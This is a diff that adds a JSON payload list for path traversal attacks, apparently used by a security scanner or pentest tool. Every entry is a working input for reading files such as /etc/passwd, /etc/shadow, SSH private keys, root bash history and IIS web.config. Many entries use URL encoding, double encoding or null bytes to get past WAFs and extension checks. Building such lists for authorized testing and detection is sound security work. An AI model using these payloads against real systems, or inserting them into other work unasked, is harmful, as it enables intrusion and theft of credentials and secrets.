@@ -1,0 +1,63 @@
+{
+  "category": "path_traversal",
+  "contexts": {
+    "linux": {
+      "description": "Path traversal payloads targeting Linux/Unix file systems",
+      "payloads": [
+        {"payload": "../../../etc/passwd", "description": "3-level traversal to /etc/passwd", "waf_bypass": false},
+        {"payload": "../../../../etc/passwd", "description": "4-level traversal to /etc/passwd", "waf_bypass": false},
+        {"payload": "../../../../../etc/passwd", "description": "5-level traversal to /etc/passwd", "waf_bypass": false},
+        {"payload": "/etc/passwd", "description": "Absolute path to passwd", "waf_bypass": false},
+        {"payload": "../../../etc/shadow", "description": "Traversal to /etc/shadow (requires root)", "waf_bypass": false},
+        {"payload": "../../../proc/self/environ", "description": "Process environment variables", "waf_bypass": false},
+        {"payload": "../../../proc/self/cmdline", "description": "Process command line arguments", "waf_bypass": false},
+        {"payload": "../../../proc/self/fd/0", "description": "Process stdin file descriptor", "waf_bypass": false},
+        {"payload": "../../../var/log/apache2/access.log", "description": "Apache access log (log poisoning)", "waf_bypass": false},
+        {"payload": "../../../var/log/nginx/access.log", "description": "Nginx access log (log poisoning)", "waf_bypass": false},
+        {"payload": "../../../home/user/.ssh/id_rsa", "description": "SSH private key retrieval", "waf_bypass": false},
+        {"payload": "../../../root/.bash_history", "description": "Root bash history", "waf_bypass": false}
+      ]
+    },
+    "windows": {
+      "description": "Path traversal payloads targeting Windows file systems",
+      "payloads": [
+        {"payload": "..\\..\\..\\windows\\win.ini", "description": "Windows win.ini traversal with backslash", "waf_bypass": false},
+        {"payload": "../../../windows/win.ini", "description": "Windows win.ini with forward slash", "waf_bypass": false},
+        {"payload": "..\\..\\..\\boot.ini", "description": "Windows boot.ini", "waf_bypass": false},
+        {"payload": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "description": "Windows hosts file", "waf_bypass": false},
+        {"payload": "C:\\windows\\win.ini", "description": "Absolute Windows path", "waf_bypass": false},
+        {"payload": "..\\..\\..\\inetpub\\wwwroot\\web.config", "description": "IIS web.config disclosure", "waf_bypass": false},
+        {"payload": "../../../../../../../../../../../../../../windows/win.ini", "description": "Over-traversal normalized to root", "waf_bypass": false}
+      ]
+    },
+    "url_encoded": {
+      "description": "URL-encoded path traversal payloads to bypass input filters",
+      "payloads": [
+        {"payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "description": "Fully URL-encoded traversal", "waf_bypass": true},
+        {"payload": "%2e%2e/%2e%2e/%2e%2e/etc/passwd", "description": "Encoded dots with literal slashes", "waf_bypass": true},
+        {"payload": "..%2f..%2f..%2fetc%2fpasswd", "description": "Encoded forward slashes", "waf_bypass": true},
+        {"payload": "..%2f..%2f..%2fetc/passwd", "description": "Mixed encoded and literal slashes", "waf_bypass": true},
+        {"payload": "%2e%2e%5c%2e%2e%5cwindows%5cwin.ini", "description": "URL-encoded backslash traversal (Windows)", "waf_bypass": true},
+        {"payload": "..%5c..%5c..%5cwindows%5cwin.ini", "description": "Encoded backslash Windows traversal", "waf_bypass": true}
+      ]
+    },
+    "double_encoded": {
+      "description": "Double URL-encoded payloads to bypass dual-decode defenses",
+      "payloads": [
+        {"payload": "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd", "description": "Double URL-encoded traversal", "waf_bypass": true},
+        {"payload": "%252e%252e%255c%252e%252e%255cwindows%255cwin.ini", "description": "Double-encoded backslash Windows traversal", "waf_bypass": true},
+        {"payload": "..%25%32%66..%25%32%66..%25%32%66etc%25%32%66passwd", "description": "Mixed double encoding", "waf_bypass": true}
+      ]
+    },
+    "null_byte": {
+      "description": "Null byte injection payloads to truncate file extension checks",
+      "payloads": [
+        {"payload": "../../../etc/passwd%00.jpg", "description": "Null byte to truncate .jpg extension (PHP 5.x)", "waf_bypass": true},
+        {"payload": "../../../etc/passwd%00", "description": "Null byte string terminator", "waf_bypass": true},
+        {"payload": "../../../etc/passwd\u0000.png", "description": "Unicode null byte with .png extension", "waf_bypass": true},
+        {"payload": "../../../etc/passwd%00/etc/passwd", "description": "Null byte mid-path injection", "waf_bypass": true},
+        {"payload": "..%00/..%00/..%00/etc/passwd", "description": "Null byte in traversal segments", "waf_bypass": true}
+      ]
+    }
+  }
+}
